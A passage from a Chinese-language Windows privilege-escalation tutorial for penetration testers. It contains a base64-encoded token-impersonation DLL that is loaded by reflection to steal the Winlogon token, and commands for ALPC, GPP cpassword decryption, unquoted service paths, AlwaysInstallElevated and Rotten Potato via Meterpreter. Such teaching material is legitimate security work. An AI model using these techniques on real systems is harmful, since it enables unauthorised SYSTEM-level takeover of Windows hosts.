> AEQPRAFaAWgLRAFaACQbRAFaASALRAFaAMgPRAFaAlQLRAFaAUgfRAFaAIALRA
> FaA6QXRAFaA+AXRAFaA0QXRAFaAzgTRAAAAAACAAJEguQTVAAEAAAAAAIAAliBg
> B94ABABQIAAAAACWAGAH5gAHAAAAAACAAJEgtAXuAAkAAAAAAIAAliBzBfYADQA
> AAAAAgACRIGQFNgAQAAAAAACAAJEg1Ab+ABIAAAAAAIAAkSBsBw0BGQAAAAAAg
> ACWIPsEEQEZAHAgAAAAAJYAZwIbARwATCEAAAAAlgCFAhsBHQAgIgAAAACWAJw
> FIAEeAK8iAAAAAIYYNwYGAB8AuCIAAAAAkRg9BiUBHwB6IwAAAACRGD0GJQEfAA
> AAAQDzAgAAAgAAAwIAAwB+AgAAAQBEBwAAAgDkAgAAAwA+AgAAAQAyAgAAAg
> AwBwAgAAAAAAAAAQDWAgAAAgA2BwIAAwDCAgAAAQC6AgAAAgC+AAAAAwClA
>
> gAAAQDOAgAAAgCCBQAgAAAAAAAAAQDCAgAgAgC/BgAAAwApAwAABAAJBwAA
> BQAbAwIABgD1BgAAAQDFBQAAAgCsBgIAAwCFBwAAAQCLAgAAAQCLAgAAAQB6
> AgkANwYBABEANwYGABkANwYKACkANwYQADEANwYQADkANwYQAEEANwYQA
> EkANwYQAFEANwYQAFkANwYQAGEANwYVAGkANwYQAHEANwYQAHkANwYQAJk
> ANwYGAIkANwIeAKkAMgYzAKkArgc2ALEA2gRSAIEANwYGAAgABAByAAkATAByAA
> kAUAB3AAkAVAB8AAkAWACBAAkAgACGAAkAhAByAAkAiAB3AAkAjACLAAkAkACQ
>
> AAkAlACVAAkAmACaAAkAnACfAAkAoACkAAkApACpAAkAqACuAAkArACzAAkAsAC
> 4AC4ACwApAS4AEwAyAS4AGwBRAS4AIwBaAS4AKwB1AS4AMwB1AS4AOwB1AS4A
> QwBaAS4ASwB7AS4AUwB1AS4AWwB1AS4AYwCTAS4AawC9AS4AcwDKAeMAewB
> yABMAwAAlAMAAKQDAADQAvQA8AL0AGgAiADwAXgAcBSkFAAEDALkEAQBAAQU
> AYAcCAEABCQC0BQEAAAELAHMFAQBAAQ0AZAUBAEABDwDUBgEAQAERAGwHA
> gBAARMA+wQBAASAAAABAAAAAAAAAAAAAAAAANsAAAAEAAAAAAAAAAAAAABp
> ACkCAAAAAAQAAAAAAAAAAAAAAGkAWAUAAAAAAwACAAQAAgAFAAIABgACAAc
> AAgAnAFkAAAAAPE1vZHVsZT4AVE9LRU5fUkVBRABTVEFOREFSRF9SSUdIVFNfUk
> VBRABTRV9QUklWSUxFR0VfRU5BQkxFRABTVEFOREFSRF9SSUdIVFNfUkVRVUlSR
> UQAU0VfUFJJVklMRUdFX1JFTU9WRUQAVE9LRU5fQURKVVNUX1NFU1NJT05JRAB
> MVUlEAFRPS0VOX1FVRVJZX1NPVVJDRQBUT0tFTl9EVVBMSUNBVEUAVE9LRU5fS
> U1QRVJTT05BVEUAU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTABJbXBlcnNvbm
> F0aW9uVG9rZW5ETEwAUFJPQ0VTU19RVUVSWV9JTkZPUk1BVElPTgBUT0tFTl9QU
> klWSUxFR0VTAFRPS0VOX0FESlVTVF9QUklWSUxFR0VTAExVSURfQU5EX0FUVFJJ
> QlVURVMAVE9LRU5fQURKVVNUX0dST1VQUwBUT0tFTl9BTExfQUNDRVNTAFNFX1
> BSSVZJTEVHRV9VU0VEX0ZPUl9BQ0NFU1MAUFJJVklMRUdFX1NFVABUT0tFTl9BR
> EpVU1RfREVGQVVMVABTRV9QUklWSUxFR0VfRU5BQkxFRF9CWV9ERUZBVUxUAE
> FOWVNJWkVfQVJSQVkAVE9LRU5fQVNTSUdOX1BSSU1BUlkAUFJJVklMRUdFX1NFV
> F9BTExfTkVDRVNTQVJZAFRPS0VOX1FVRVJZAHZhbHVlX18AU2V0UXVvdGEAbXNjb
>
> 3JsaWIAcHJvYwBnZXRfSWQAcHJvY2Vzc0lkAFZpcnR1YWxNZW1vcnlSZWFkAENyZ
>
> WF0ZVRocmVhZABJc1ByaXZpbGVnZUVuYWJsZWQAcGlkAGxwTHVpZABFbmFibGV
> Qcml2aWxlZ2UARHVwbGljYXRlSGFuZGxlAER1cGxpY2F0ZVRva2VuSGFuZGxlAEV4a
> XN0aW5nVG9rZW5IYW5kbGUAcEhhbmRsZQBQcm9jZXNzSGFuZGxlAGJJbmhlcml0
> SGFuZGxlAGxwU3lzdGVtTmFtZQBscE5hbWUAVmFsdWVUeXBlAFRlcm1pbmF0ZQB
> QcmV2aW91c1N0YXRlAE5ld1N0YXRlAFZpcnR1YWxNZW1vcnlXcml0ZQBHdWlkQXR0
> cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc
>
> 3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhc
> mdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidX
> RlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0
> aW9uQXR0cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvb
> nNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29we
> XJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ2
> 9tcGF0aWJpbGl0eUF0dHJpYnV0ZQBMb29rdXBQcml2aWxlZ2VWYWx1ZQBTeW5ja
> HJvbml6ZQBTaXplT2YAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBQcml2aWxlZ2VD
> aGVjawB6YzAwbABNYXJzaGFsAEFsbABhZHZhcGkzMi5kbGwAa2VybmVsMzIuZGxs
> AEltcGVyc29uYXRpb25Ub2tlbkRMTC5kbGwAQ29udHJvbABTeXN0ZW0ARW51bQB
> TZXRUaHJlYWRUb2tlbgBEdXBsaWNhdGVUb2tlbgBoVG9rZW4ASW1wZXJzb25hdGlv
> blRva2VuAEltcGVyc29uYXRlUHJvY2Vzc1Rva2VuAE9wZW5Qcm9jZXNzVG9rZW4AQ
> 2xpZW50VG9rZW4AUXVlcnlMaW1pdGVkSW5mb3JtYXRpb24AU2V0SW5mb3JtYXR
> pb24AUXVlcnlJbmZvcm1hdGlvbgBWaXJ0dWFsTWVtb3J5T3BlcmF0aW9uAFN5c3Rlb
> S5SZWZsZWN0aW9uAFplcm8ALmN0b3IALmNjdG9yAEludFB0cgBTeXN0ZW0uRGlh
> Z25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW
> 50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAUmVxdWlyZWRQ
> cml2aWxlZ2VzAERpc2FibGVBbGxQcml2aWxlZ2VzAEFkanVzdFRva2VuUHJpdmlsZW
> dlcwBBdHRyaWJ1dGVzAFJldHVybkxlbmd0aEluQnl0ZXMAQnVmZmVyTGVuZ3RoSW
> 5CeXRlcwBQcm9jZXNzQWNjZXNzRmxhZ3MAZmxhZ3MARGVzaXJlZEFjY2VzcwBwc
> m9jZXNzQWNjZXNzAENyZWF0ZVByb2Nlc3MAT3BlblByb2Nlc3MAR2V0Q3VycmVud
> FByb2Nlc3MAT2JqZWN0AHBmUmVzdWx0AFByaXZpbGVnZUNvdW50AEhpZ2hQYX
> J0AExvd1BhcnQAb3BfRXF1YWxpdHkAAAAAAAAANMB5wx4YykSS6Z0DEn72xgAEIA
> EBCAMgAAEFIAEBEREEIAEBDgQgAQECAwcBGAMgAAgQBwsCERAYGBEYAgICAh
> EYAgIGGAUAAgIYGBUHDREQGBgRDBEUERQJAgICEQwRFAIGEAEBCB4ABAoBER
> QKBwgYGBgCAgICAgi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQAAACABP8PHwA
> ECAAAAAQQAAAABCAAAAAEQAAAAASAAAAABAABAAAEAAIAAAQABAAABAAQAA
> AEAAAQAAIeAQECAgYIAgYJAwYREAQGHREMAwYRHAgAAwIODhAREAcAAxgRHAII
> BwACGBJFERwHAAMCGAkQGAcAAwIYCBAYDgAGAhgCEBEUCRARFBAJAwAAGAk
> AAwIYEBEYEAIEAAECDgQAAQIIAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbk
>
> V4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAaAQAVSW1wZXJzb25hdGlvblRva2VuREx
>
> MAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDE4AAApAQAkZDUzNGM1NTgt
>
> NDNjYy00ZGEyLWE3NTUtMDYyMTM1ZDA2NzE4AAAMAQAHMS4wLjAuMAAATQEA
>
> HC5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC41LjIBAFQOFEZyYW1ld29ya0Rpc3BsYXl
> OYW1lFC5ORVQgRnJhbWV3b3JrIDQuNS4yAAAAAP9SNtQAAAAAAgAAAIEAAADgM
> wAA4BUAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTtwWwQJTN
>
> z0WcHiOfEy1IZwEAAABDOlxVc2Vyc1xhbmRyZVxzb3VyY2VccmVwb3NcVG9rZW5Jb
> XBlcnNvbmF0aW9uXEltcGVyc29uYXRpb25Ub2tlbkRMTFxvYmpcRGVidWdcSW1wZX
> Jzb25hdGlvblRva2VuRExMLnBkYgCJNAAAAAAAAAAAAACjNAAAACAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAlTQAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmV
> lLmRsbAAAAAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAA
> AAAAAAABAAAAAABIAAAAWEAAAHwDAAAAAAAAAAAAAHwDNAAAAFYAUwBfAFY
> ARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAA
> ABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhA
> HIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAa
> QBvAG4AAAAAAAAAsATcAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmA
> G8AAAC4AgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUA
> bgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAA
> AAAAVAAWAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEk
> AbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AVABvAGsAZQBuAEQATABMAAAAMA
> AIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAA
> AAVAAaAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABJAG0AcABlAHIAcwB
> vAG4AYQB0AGkAbwBuAFQAbwBrAGUAbgBEAEwATAAuAGQAbABsAAAASAASAAE
> ATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwB
> oAHQAIACpACAAIAAyADAAMQA4AAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQA
> ZQBtAGEAcgBrAHMAAAAAAAAAAABcABoAAQBPAHIAaQBnAGkAbgBhAGwARgBpA
>
> GwAZQBuAGEAbQBlAAAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBUAG8Aa
> wBlAG4ARABMAEwALgBkAGwAbAAAAEwAFgABAFAAcgBvAGQAdQBjAHQATgBhA
> G0AZQAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBUAG8AawBlAG4AR
> ABMAEwAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAx
> AC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAc
> wBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAMAAAAuDQAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> AAAAAAAA\")) \| Out-Null
>
> Write-Output \"DLL has been reflected.\"
>
> }
>
> if(-not
> \[zc00l.ImpersonationToken\]::ImpersonateProcessToken((Get-Process Win
> logon).Id))
>
> {
>
> Write-Output \"Could not Impersonate Token! Maybe you are not Local
> Admin?
>
> \";
>
> return;
>
> }
>
> Write-Output \"We are: \$(\[Environment\]::Username)\"
>
> }
![](media/image222.jpeg){width="5.806196412948381in"
height="4.145624453193351in"}
## 15.ALPC (T1068)
https://github.com/realoriginal/alpc-diaghub
![](media/image223.png){width="5.773320209973753in"
height="2.535311679790026in"}
> ![](media/image224.jpeg){width="5.9754604111986005in" height="6.65in"}
![](media/image225.jpeg)
####### 组策略首选项
组策略首选项可创建本地管理员账户，这些账户凭据加密存储，在域控制器的共享目录中，任何用户都可以访问。
组策略首选项里面有静态秘钥。任何用户都可以检索这些文件解密，来提升权限。
域控制器，共享目录，什么东东？请阅读文末参考资料：在域控制器主机上创建共享文件夹
> 手动
手动进入到域控制器的共享目录，找一下groups.xml 文件，是xml 文件都看看，
获取属性cpassword 的值。 把这个值给另一个可以解密的工具中：
https://[www.sec-1.com/blog/wp-](http://www.sec-1.com/blog/wp-)
content/uploads/2015/05/gp3finder_v4.0.zip
还有一个Ruby 脚本也可以用于解密cpassword
值，感兴趣的可以阅读文末参考资料：组策略首选项
借助metasploit 也可以解密，powersploit 同理，通过metasploit
运行powershell 得到密文和解密结果也是一样的道理。
这些细节都在参考资料中：组策略首选项
参 考 资 料 ： 在 域 控 制 器 主 机 上 创 建 共 享 文 件 夹 ：
https://blog.csdn.net/SouthWind0/article/details/80412890 组策略首选项：
https://pentestlab.blog/2017/03/20/group-policy-preferences/
####### 不带引号的服务路径
在windows
环境中，启动服务时会尝试查找可执行文件的位置，便于成功启动服务。
如果可执行文件的路径包含在引号中，系统将知道在哪里找到它。
但是，如果应用程序二进制文件所在的路径不包含任何引号的话，windows
将尝试查找它并在此路径的 每个文件夹中执行它，直到它们找到可执行文件。
如果服务在SYSTEM 权限下运行，则可以滥用此权限已提升权限。
注意，从windows xp 到windows 10 都有这个至高无上的system 权限。
如果您运行whoami 命令发现找不到system 权限或者对system
权限较为生疏，请阅读参考资料：从 Admin 权限切换到 System 权限
从控制面板-管理工具，中的每个文件，右键-属性-安全，也可以发现与权限有关的信息。
-   手动利用
尝试发现目标主机上运行的所有服务，识别那些未包含在引号内的服务。
> wmic service get name,displayname,pathname,startmode \| findstr /i
> \"auto\" \| findstr
>
> /i /v \"c:\\windows\\\\\" \| findstr /i /v \"\"\"
解释：wmic service get，wmic service 和wmic 都是CMD 命令，您可以分别使用
/?查询帮助参数，后面的name,displayname 都是属性，用逗号分离。findstr
命令同理，/?获取帮助。 进入控制面板-管理工具-服务
最后一个字段有一个本地系统，就是system 权限下运行的服务。
检查当前用户在这个服务所在的相关前后目录中，是否具有"写入"权限。
> icacls \"C:\\Program Files (x86)\\Lenovo\"
可以生成恶意二进制文件到该文件夹中植入此可执行文件。当服务重启时，
windows 将通过向用户提供system 权限 来启动这个可执行文件。
Metasploit Framework
提供了一个模块，可以自动检查目标系统是否存在任何易受攻击的服务，生成有效负载，将二进制文件拖放到具有写访问权限的目标文件夹中，重启服务并在执行有效负载后立即删除二进制文件和会话被建造。详情，请阅读参考资料：不带引号的服务路径
PowerSploit 工具同理。
参 考 资 料 ： 从 Admin 权 限 切 换 到 System 权 限 ：
https://blog.csdn.net/qq_35129925/article/details/85115523
不带引号的服务路径：https://pentestlab.blog/2017/03/09/unquoted-service-path/
####### Always Install Elevated 策略
我们的个人电脑里面哪里有这么多的策略需求，肯定是企业服务器中的需求。除非个人的系统在安装时，已经自动偷偷设置了。
Windows 环境提供组策略设置，允许常规用户安装具有系统权限的Microsoft
Windows Installer
程序包（MSI）。这可以在标准用户想要安装需要系统权限的应用程序的环境中发现，并且管理员希望避免向用户提供临时本地管理员访问权限。
意思就是他设置了这个策略，你就可以安装应用，拥有system 权限。
这里说的组策略设置英译为：group policy
setting。它指的是，参考资料中的：配置安全策略设置
如果你启用这个策略的话，从安全的角度来看，攻击者可能会滥用此权限，以便将其权限升级到SYSTEM。
详情，请阅读参考资料：Always Install Elevated 策略
-   确认Always Install Elevated 策略是否存在
    假设我们已经破坏了网络内的主机，并且我们有一个Meterpreter 会话。
通过注册表的选项来确认是否存在Always Install Elevated 策略
> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v
> AlwaysInstall Elevated
>
> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v
> AlwaysInstall Elevated
-   使用Metasploit 或PowerSploit 都可以提升权限
    如果此策略存在的话，可以使用Metasploit 或PowerSploit。
    细节步骤，请阅读参考资料：Always Install Elevated
参 考 资 料 ： Always Install Elevated：
https://pentestlab.blog/2017/02/28/always-install-elevated/ Always
Install Elevated 策 略 ：https://docs.microsoft.com/en-
us/windows/win32/msi/alwaysinstallelevated 配 置 安 全 策 略 设 置 ：
https://docs.microsoft.com/en-us/windows/security/threat-
protection/security-policy-settings/how-to-configure-security-policy-
settings
####### 令牌操作（token）
众所周知，将Windows
服务作为本地系统运行是一种糟糕的安全措施，就好像这种服务以任何方式受到损害一样，它也会为攻击者提供相同级别的权限。但是，也可以从未作为SYSTEM
运行的服务升级权限，也可以升级为网络服务。
-   从服务账户（NETWORK SERVICE）到本地系统（Local system）的权限提升
在渗透测试项目中，渗透测试人员已经设法破坏了Apache，IIS，SQL，MySQL
等服务，但很遗憾，这项服务不是作为本地系统运行。
就是以网络服务身份运行的Apache 服务。
在这种情况下，Meterpeter 的可用令牌列表仅限于网络服务，因为Apache
在此帐户下运行。 网络服务权限：NT AUTHORITY\\NETWORK SERVICE
我们的目的是将网络服务权限，提升到本地系统权限：NT AUTHORITY\\SYSTEM。
有一种技术可以让我们从服务账户，成为本地系统。 试图欺骗"NT Authority \\
System" 帐户在本地通过NTLM 进行协商和认证，因此"NT Authority \\
System"帐户的令牌将变得可用，因此特权升级成为可能。这种技术被称为 Rotten
Potato （腐烂马铃薯）.，关于烂马铃薯，可阅读参考资料：烂马铃薯
这个腐烂马铃薯的技术，具体应用起来，它是一个二进制文件，叫作rottenpotato.exe，它在参考资料中下载：RottenPotato
在meterpreter 中使用。
> execute -f rottenpotato.exe -Hc impersonate_token \"NT
> AUTHORITY\\\\SYSTEM\" getudi
-   服务以管理员身份运行